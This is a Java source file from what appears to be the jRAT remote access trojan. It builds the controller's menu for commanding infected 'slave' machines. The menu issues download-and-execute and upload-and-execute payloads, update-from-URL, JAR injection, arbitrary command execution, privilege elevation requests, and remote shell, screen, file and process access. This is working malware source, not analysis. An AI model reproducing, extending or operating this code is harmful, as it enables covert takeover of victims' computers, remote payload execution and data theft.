package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.common.downloadable.Downloadable;
import io.jrat.controller.AbstractSlave;
import io.jrat.controller.OfflineSlave;
import io.jrat.controller.Slave;
import io.jrat.controller.addons.ClientFormat;
import io.jrat.controller.net.URLParser;
import io.jrat.controller.packets.outgoing.Packet100RequestElevation;
import io.jrat.controller.packets.outgoing.Packet11Disconnect;
import io.jrat.controller.packets.outgoing.Packet14VisitURL;
import io.jrat.controller.packets.outgoing.Packet17DownloadExecute;
import io.jrat.controller.packets.outgoing.Packet18Update;
import io.jrat.controller.packets.outgoing.Packet36Uninstall;
import io.jrat.controller.packets.outgoing.Packet37RestartJavaProcess;
import io.jrat.controller.packets.outgoing.Packet38RunCommand;
import io.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
import io.jrat.controller.packets.outgoing.Packet45Reconnect;
import io.jrat.controller.packets.outgoing.Packet98InjectJAR;
import io.jrat.controller.settings.StoreOfflineSlaves;
import io.jrat.controller.threads.ThreadUploadFile;
import io.jrat.controller.ui.dialogs.DialogFileType;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.frames.FrameNotes;
import io.jrat.controller.ui.frames.FrameRemoteChat;
import io.jrat.controller.ui.frames.FrameRemoteFiles;
import io.jrat.controller.ui.frames.FrameRemoteProcess;
import io.jrat.controller.ui.frames.FrameRemoteScreen;
import io.jrat.controller.ui.frames.FrameRemoteShell;
import io.jrat.controller.ui.frames.FrameRename;
import io.jrat.controller.ui.frames.FrameSystemInfo;
import io.jrat.controller.utils.NetUtils;
import io.jrat.controller.utils.Utils;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import javax.swing.Icon;
import javax.swing.JFileChooser;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import jrat.api.Client;
import jrat.api.ui.RATMenuItem;
import oslib.OperatingSystem;

@SuppressWarnings("serial")
public abstract class PanelMainClients extends JScrollPane {

	public PanelMainClients() {
		
	}
	
	/**
	 * Return name to describe this view
	 * @return
	 */
	public abstract String getViewName();
	
	public abstract Icon getIcon();
	
	public abstract void addSlave(AbstractSlave slave);
	
	public abstract void removeSlave(AbstractSlave slave);

	public abstract AbstractSlave getSlave(int row);
	
	public abstract List<AbstractSlave> getSelectedSlaves();
	
	public abstract AbstractSlave getSelectedSlave();
	
	public abstract void clear();

	/**
	 * Returns the configuration menu for this view
	 * @return
	 */
	public abstract List<JMenuItem> getConfigMenu();

	public JMenu mnQuickOpen;
	
	/**
	 * Returns the default popup menu for each {@link AbstractSlave}
	 * @return
	 */
	public final JPopupMenu getPopupMenu() {
		final JPopupMenu popupMenu = new JPopupMenu();
		
		JMenuItem mntmControlPanel = new JMenuItem("Control Panel                       ");
		mntmControlPanel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameControlPanel screen = new FrameControlPanel((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmControlPanel.setIcon(IconUtils.getIcon("controlpanel"));

		popupMenu.add(mntmControlPanel);
		popupMenu.addSeparator();

		JMenu mnNetworking = new JMenu("Networking");
		mnNetworking.setIcon(IconUtils.getIcon("process"));
		popupMenu.add(mnNetworking);

		JMenuItem mntmexe = new JMenuItem("Download and Execute");
		mnNetworking.add(mntmexe);
		mntmexe.setIcon(IconUtils.getIcon("arrow-down"));

		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
		mntmUploadAndExecute.setIcon(IconUtils.getIcon("drive-upload"));
		mntmUploadAndExecute.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					final File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (final AbstractSlave slave : servers) {
						if (slave instanceof Slave) {						
							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new ThreadUploadFile(null, file.getName(), file) {
								@Override
								public void onComplete() {
									super.onComplete();
									((Slave) slave).addToSendQueue(new Packet17DownloadExecute(file.getName(), Downloadable.getFileExtension(file.getName()), file));
								}
							}));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUploadAndExecute);

		mnNetworking.addSeparator();

		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
		mnNetworking.add(mntmUpdateFromUrl);
		mntmUpdateFromUrl.setIcon(IconUtils.getIcon("update"));

		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
		mntmUpdateFromFile.setIcon(IconUtils.getIcon("drive-upload"));
		mntmUpdateFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					final File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					for (final AbstractSlave slave : servers) {
						
						if (slave instanceof Slave) {							
							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new ThreadUploadFile(null, file.getName(), file) {
								@Override
								public void onComplete() {
									super.onComplete();
									((Slave) slave).addToSendQueue(new Packet18Update(file));
								}
							}));
						}
					}
				}
			}
		});
		mnNetworking.add(mntmUpdateFromFile);

		mnNetworking.addSeparator();

		JMenuItem mntmHost = new JMenuItem("Host");
		mnNetworking.add(mntmHost);
		mntmHost.setIcon(IconUtils.getIcon("computer"));
		mntmHost.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null) {
					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
				}
			}
		});
		mntmUpdateFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Update from URL", "Input URL to update with");
					if (result == null) {
						return;
					}
					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					for (AbstractSlave sl : servers) {
						if (sl instanceof Slave) {
							((Slave)sl).addToSendQueue(new Packet18Update(result));
						}
					}
				}
			}
		});
		mntmexe.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
					if (result == null) {
						return;
					}

					try {
						URLParser.parse(result);
					} catch (Exception ex) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim().replace(" ", "%20");

					String filetype = DialogFileType.showDialog();

					if (filetype == null) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet17DownloadExecute(result, filetype));
						}
					}
				}
			}
		});

		mnQuickOpen = new JMenu("Quick Open");
		mnQuickOpen.setIcon(IconUtils.getIcon("application-import"));
		popupMenu.add(mnQuickOpen);

		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
		mntmRemoteScreen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteScreen.show((Slave) slave);
				}
			}
		});

		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
		mnQuickOpen.add(mntmVisitUrl);
		mntmVisitUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String result = Utils.showDialog("Visit URL", "Input URL to visit");
					
					if (result != null && !NetUtils.isURL(result)) {
						result = "http://" + result;
					}
					
					if (result == null) {
						return;
					}

					if (!NetUtils.isURL(result)) {
						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
						return;
					}

					result = result.trim();

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet14VisitURL(result));
						}
					}
				}

			}
		});
		mntmVisitUrl.setIcon(IconUtils.getIcon("application-browser"));
		mntmRemoteScreen.setIcon(IconUtils.getIcon("screen"));
		mnQuickOpen.add(mntmRemoteScreen);

		JMenuItem mntmFileManager = new JMenuItem("File Manager");
		mntmFileManager.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteFiles frame = new FrameRemoteFiles((Slave) slave);
					frame.setVisible(true);
				}
			}
		});


		mntmFileManager.setIcon(IconUtils.getIcon("folder-go"));
		mnQuickOpen.add(mntmFileManager);

		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
		mntmRemoteCmd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteShell frame = new FrameRemoteShell((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteCmd.setIcon(IconUtils.getIcon("terminal"));
		mnQuickOpen.add(mntmRemoteCmd);

		final JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
		mntmRemoteChat.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteChat frame = new FrameRemoteChat((Slave) slave);
					frame.setVisible(true);
				}
			}
		});

		JMenuItem mntmRemoteProcess = new JMenuItem("Remote Process");
		mntmRemoteProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRemoteProcess frame = new FrameRemoteProcess((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mntmRemoteProcess.setIcon(IconUtils.getIcon("process-go"));
		mnQuickOpen.add(mntmRemoteProcess);
		mntmRemoteChat.setIcon(IconUtils.getIcon("chat"));
		mnQuickOpen.add(mntmRemoteChat);

		JMenuItem mntmNotes = new JMenuItem("Notes");
		mntmNotes.setIcon(IconUtils.getIcon("notes"));
		mntmNotes.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameNotes frame = new FrameNotes((Slave) slave);
					frame.setVisible(true);
				}
			}
		});
		mnQuickOpen.add(mntmNotes);
		
		JMenu mnTools_1 = new JMenu("Tools");
		mnTools_1.setIcon(IconUtils.getIcon("toolbox"));
		popupMenu.add(mnTools_1);
		
				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
				mnTools_1.add(mntmRunCommand);
				mntmRunCommand.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						List<AbstractSlave> servers = getSelectedSlaves();
						if (servers.size() > 0) {
							String process = Utils.showDialog("Run Command", "Select command to send to connections");
							if (process == null) {
								return;
							}

							for (AbstractSlave slave : servers) {
								if (slave instanceof Slave) {
									((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
								}
							}
						}
					}
				});
				mntmRunCommand.setIcon(IconUtils.getIcon("execute"));

		JMenu mnInject = new JMenu("Inject JAR");
		mnTools_1.add(mnInject);
		mnInject.setIcon(IconUtils.getIcon("inject"));

		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
		mntmInjectFromUrl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					String url;

					url = Utils.showDialog("Inject from URL", "Type file URL");

					if (url == null || url != null && url.length() == 0) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(url, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromUrl.setIcon(IconUtils.getIcon("arrow-down"));
		mnInject.add(mntmInjectFromUrl);

		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
		mntmInjectFromFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					JFileChooser f = new JFileChooser();
					f.showOpenDialog(null);

					File file = f.getSelectedFile();

					if (file == null) {
						return;
					}

					String mainClass;

					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");

					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
						return;
					}

					for (AbstractSlave slave : servers) {
						if (slave instanceof Slave) {
							((Slave)slave).addToSendQueue(new Packet98InjectJAR(file, mainClass));
						}
					}
				}
			}
		});
		mntmInjectFromFile.setIcon(IconUtils.getIcon("drive-upload"));
		mnInject.add(mntmInjectFromFile);
		
		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
		mntmRequestElevation.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();

				for (AbstractSlave slave : servers) {
					if (slave instanceof Slave) {
						((Slave)slave).addToSendQueue(new Packet100RequestElevation());
					}
				}
			}
		});
		mntmRequestElevation.setIcon(IconUtils.getIcon("shield"));
		mnTools_1.add(mntmRequestElevation);
		popupMenu.addSeparator();

		JMenuItem mntmInfo = new JMenuItem("Info");
		mntmInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameSystemInfo screen = new FrameSystemInfo((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmInfo.setIcon(IconUtils.getIcon("info"));
		popupMenu.add(mntmInfo);

		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
		mntmForceDisconnect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet11Disconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRestart = new JMenuItem("Restart");
		mntmRestart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		JMenuItem mntmRename = new JMenuItem("Rename");
		mntmRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				AbstractSlave slave = getSelectedSlave();
				if (slave != null && slave instanceof Slave) {
					FrameRename screen = new FrameRename((Slave) slave);
					screen.setVisible(true);
				}
			}
		});
		mntmRename.setIcon(IconUtils.getIcon("rename"));
		popupMenu.add(mntmRename);
		popupMenu.addSeparator();
		mntmRestart.setIcon(IconUtils.getIcon("refresh"));
		popupMenu.add(mntmRestart);

		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
		mntmRestartConnection.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet45Reconnect());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});
		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh-blue"));
		popupMenu.add(mntmRestartConnection);
		mntmForceDisconnect.setIcon(IconUtils.getIcon("delete"));
		popupMenu.add(mntmForceDisconnect);

		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
		mntmUninstall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<AbstractSlave> servers = getSelectedSlaves();
				if (servers.size() > 0) {
					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " connections")) {
						for (AbstractSlave sl : servers) {
							try {
								if (sl instanceof Slave) {
									((Slave)sl).addToSendQueue(new Packet36Uninstall());
								}
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}
		});

		mntmUninstall.setIcon(IconUtils.getIcon("exit"));
		popupMenu.add(mntmUninstall);
		
		popupMenu.addPopupMenuListener(new PopupMenuListener() {
			public void popupMenuCanceled(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {
				try {
					for (int i = 0; i < popupMenu.getComponents().length; i++) {
						Component child = popupMenu.getComponents()[i];
						if (child instanceof JMenuItem) {
							JMenuItem item = (JMenuItem) child;

							if (item.getText().equals("Remove")) {
								popupMenu.remove(i - 1);
								popupMenu.remove(child);
							}
						}
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}

			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				try {
					final List<AbstractSlave> list = getSelectedSlaves();

					if (list.size() > 0) {
						boolean offlineExists = false;

						for (AbstractSlave slave : list) {
							if (slave instanceof OfflineSlave) {
								offlineExists = true;
							}
						}

						if (offlineExists) {
							popupMenu.addSeparator();

							JMenuItem mntmRemove = new JMenuItem("Remove");
							mntmRemove.setIcon(IconUtils.getIcon("delete"));

							mntmRemove.addActionListener(new ActionListener() {
								@Override
								public void actionPerformed(ActionEvent e) {
									for (int i = 0; i < list.size(); i++) {
										AbstractSlave slave = list.get(i);

										if (slave instanceof OfflineSlave) {
											OfflineSlave offline = (OfflineSlave) slave;
											StoreOfflineSlaves.getGlobal().remove(offline);
											removeSlave(slave);
										}
									}
								}
							});

							popupMenu.add(mntmRemove);
						}
					}

					repaint();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		if (RATMenuItem.getEntries().size() > 0) {
			popupMenu.addSeparator();
		}

		for (final RATMenuItem ritem : RATMenuItem.getEntries()) {
			JMenuItem item = ritem.getItem();

			item.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					List<AbstractSlave> list = getSelectedSlaves();
					List<Client> servers = new ArrayList<Client>();
					for (int i = 0; i < list.size(); i++) {
						servers.add(ClientFormat.format(list.get(i)));
					}

					ritem.getListener().onClick(servers);
				}
			});

			popupMenu.add(item);
		}

		return popupMenu;
	}

}